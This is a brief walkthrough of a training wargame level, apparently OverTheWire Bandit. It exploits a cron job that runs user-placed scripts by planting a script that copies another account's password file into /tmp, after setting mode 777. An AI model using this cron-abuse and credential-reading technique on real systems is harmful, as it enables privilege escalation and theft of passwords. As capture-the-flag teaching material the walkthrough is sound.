Again follow the cronjobs and you will found that there is a script, and that script run all the script owned by your user.
You just have to write your own script, and inject it to the folder. Here is the script that i write:

cd /tmp
mkdir <temporary>
cd <temporary>
vi script.sh

#!/bin/bash
cat /etc/bandit_pass/bandit24 >> /tmp/scripts/bandit24_pass


After that, change the permission on the file to permit all user to be able to read it, modify and execute it.
chmod 777 script.sh

then, move it to the folder

cp script.sh /var/spool/bandit24/foo
